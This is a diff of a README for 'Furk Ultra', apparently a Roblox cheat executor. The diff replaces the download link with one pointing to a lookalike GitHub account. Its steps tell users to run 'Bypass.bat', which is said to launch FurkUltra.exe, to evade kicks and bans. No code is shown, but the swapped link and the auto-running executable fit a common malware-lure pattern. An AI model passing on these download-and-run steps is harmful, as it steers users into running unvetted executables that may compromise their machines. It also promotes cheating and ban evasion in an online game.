@@ -3,10 +3,10 @@ Furk Ultra is an executor with a built in scripts
 
 ## Important:  Make sure u run Bypass.bat before launching the Furk Ultra to prevent from getting kicked or banned
 
- **Click [here](https://github.com/PeakScript/Furk-Ultra/archive/refs/heads/main.zip) to download**
+ **Click [here](https://github.com/Peakscriptss/Furk-Ultra/archive/refs/heads/main.zip) to download**
 
 # 📁 〢 Tutorial
-1) Download the [Furk Ultra](https://github.com/PeakScript/Furk-Ultra/archive/refs/heads/main.zip)
+1) Download the [Furk Ultra](https://github.com/Peakscriptss/Furk-Ultra/archive/refs/heads/main.zip)
 3) Extract the ZIP file
 4) Run the Bypass.bat (it automatically runs the FurkUltra.exe)
 5) Launch any roblox game you want to use scripts in
